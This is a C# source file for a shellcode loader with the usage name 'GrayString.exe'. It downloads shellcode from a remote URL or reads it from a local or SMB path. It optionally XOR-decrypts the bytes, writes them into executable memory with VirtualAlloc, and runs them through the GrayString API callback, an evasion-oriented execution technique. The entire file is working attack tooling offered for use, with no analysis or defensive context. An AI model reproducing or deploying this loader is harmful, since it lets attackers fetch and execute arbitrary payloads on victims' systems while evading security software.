using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.IO;

class Program
{
    // Constants for VirtualAlloc
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;

    [DllImport("user32.dll")]
    static extern int GetDC(IntPtr hwnd);

    [DllImport("user32.dll")]
    static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int GrayString(IntPtr hDC, IntPtr hBrush, Delegate lpOutputFunc, IntPtr lpData, int nCount, int X, int Y, int nWidth, int nHeight);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    delegate bool OutputFunction(IntPtr hdc, IntPtr lpData, int cbData);

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: GrayString.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        Console.WriteLine("[Info] Allocating memory for shellcode.");
        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Memory allocated for shellcode.");
        }

        Marshal.Copy(shellcode, 0, hAlloc, shellcode.Length);

        IntPtr hDC = (IntPtr)GetDC(IntPtr.Zero);
        GrayString(hDC, IntPtr.Zero, (OutputFunction)DelegateMethod, hAlloc, 0, 0, 0, 0, 0);
        ReleaseDC(IntPtr.Zero, hDC);

        VirtualFree(hAlloc, 0, MEM_RELEASE);
    }

    

    static bool DelegateMethod(IntPtr hdc, IntPtr lpData, int cbData)
    {
        Console.WriteLine("[Success] Invoking GrayString");
        var shellcodeFunction = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(lpData);
        shellcodeFunction();
        return true;
    }

    delegate void ShellcodeDelegate();

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }
}
